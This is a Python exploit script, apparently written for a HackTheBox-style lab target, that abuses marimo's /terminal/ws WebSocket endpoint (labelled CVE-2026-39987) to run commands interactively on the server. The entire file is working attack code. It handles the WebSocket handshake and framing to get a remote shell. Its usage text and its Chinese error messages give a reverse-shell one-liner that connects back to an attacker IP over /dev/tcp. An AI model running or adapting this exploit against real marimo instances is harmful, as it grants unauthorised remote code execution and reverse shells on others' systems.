#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Interactive shell via marimo /terminal/ws (CVE-2026-39987) — keeps the WS
connection open so long-running/foreground jobs (e.g. reverse shells) are
NOT killed by SIGHUP when the one-shot script exits.

Usage:
    python marimo_shell.py                 # interactive loop
    python marimo_shell.py "cmd"           # run one command, keep 3s, exit
    python marimo_shell.py "setsid bash -i >& /dev/tcp/10.10.17.212/8888 0>&1 &"

Inside the interactive shell:
    exit / quit                            # close session
    Any command is sent to the PTY (CR-terminated).
"""
import socket, ssl, base64, os, sys, time, re

HOST = 'cohort.htb'
VHOST = 'nb-1be3782a8afd3ad5.cohort.htb'
PORT = 443
PATH = '/terminal/ws'

ANSI = re.compile(rb'\x1b\[[0-9;?]*[a-zA-Z]|\x1b\][^\x07]*\x07|\x1b[()][A-Z0-9]|\x1b[=>]|\x1b[<>]')

def build_frame(payload: bytes) -> bytes:
    mask = os.urandom(4)
    n = len(payload)
    if n < 126:
        hdr = bytes([0x81, 0x80 | n])
    elif n < 65536:
        hdr = bytes([0x81, 0x80 | 126]) + n.to_bytes(2, 'big')
    else:
        hdr = bytes([0x81, 0x80 | 127]) + n.to_bytes(8, 'big')
    return hdr + mask + bytes(b ^ mask[i % 4] for i, b in enumerate(payload))

def _recvn(sock, n):
    buf = b''
    while len(buf) < n:
        c = sock.recv(n - len(buf))
        if not c:
            raise EOFError('connection closed')
        buf += c
    return buf

def recv_frame(sock):
    hdr = _recvn(sock, 2)
    b0, b1 = hdr[0], hdr[1]
    op = b0 & 0x0F
    ln = b1 & 0x7F
    masked = (b1 & 0x80) != 0
    if ln == 126:
        ln = int.from_bytes(_recvn(sock, 2), 'big')
    elif ln == 127:
        ln = int.from_bytes(_recvn(sock, 8), 'big')
    mask = _recvn(sock, 4) if masked else b''
    data = _recvn(sock, ln)
    if masked:
        data = bytes(b ^ mask[i % 4] for i, b in enumerate(data))
    return op, data

def connect():
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    raw = socket.create_connection((HOST, PORT), timeout=15)
    sock = ctx.wrap_socket(raw, server_hostname=HOST)
    key = base64.b64encode(os.urandom(16)).decode()
    req = (f'GET {PATH} HTTP/1.1\r\nHost: {VHOST}\r\nConnection: Upgrade\r\nUpgrade: websocket\r\n'
           f'Sec-WebSocket-Key: {key}\r\nSec-WebSocket-Version: 13\r\n\r\n').encode()
    sock.sendall(req)
    resp = b''
    while b'\r\n\r\n' not in resp:
        resp += sock.recv(4096)
    head, _ = resp.split(b'\r\n\r\n', 1)
    if b'101' not in head.split(b'\r\n')[0]:
        print('[-] WebSocket upgrade failed:')
        print(head.decode(errors='replace'))
        sys.exit(1)
    sock.settimeout(1)
    return sock

def drain(sock, seconds):
    out = b''
    t0 = time.time()
    while time.time() - t0 < seconds:
        try:
            op, data = recv_frame(sock)
            if op in (1, 2):
                out += data
        except Exception:
            time.sleep(0.05)
    return out

def run(sock, cmd, wait=0.8):
    try:
        sock.sendall(build_frame(cmd.encode() + b'\r'))
    except (ConnectionError, OSError) as e:
        raise RuntimeError(f'WS connection closed: {e}') from e
    time.sleep(wait)
    data = drain(sock, 0.6)
    return ANSI.sub(b'', data).decode('utf-8', 'replace').strip()

def main():
    sock = connect()
    print('[+] interactive shell (CVE-2026-39987) — Ctrl+C to exit')
    drain(sock, 2.0)               # banner / bash ready

    if len(sys.argv) > 1:          # one-shot mode: keep connection for 3s
        cmd = ' '.join(sys.argv[1:])
        print(f'$ {cmd}')
        print(run(sock, cmd) or '(no output)')
        print('[+] keeping connection open 3s (protects foreground jobs)...')
        drain(sock, 3.0)
        print('[+] done')
        sys.exit(0)

    while True:
        try:
            drain(sock, 0.3)       # flush any server push before prompt
            try:
                c = input('shell> ')
            except EOFError:
                break
            if not c.strip():
                continue
            if c.strip() in ('exit', 'quit'):
                break
            try:
                print(run(sock, c) or '(no output)')
            except RuntimeError as e:
                print(f'\n[!] {e}')
                print('[!] WS 已断开 —— 通常是反弹命令的进程退出导致 marimo 关闭了会话。')
                print('[!] 反弹请保持 nc 监听并使用: setsid bash -i >& /dev/tcp/<ip>/8888 0>&1 &')
                break
        except KeyboardInterrupt:
            print('\n[!] Ctrl+C — type exit to quit')
    sock.close()
    sys.exit(0)

if __name__ == '__main__':
    main()
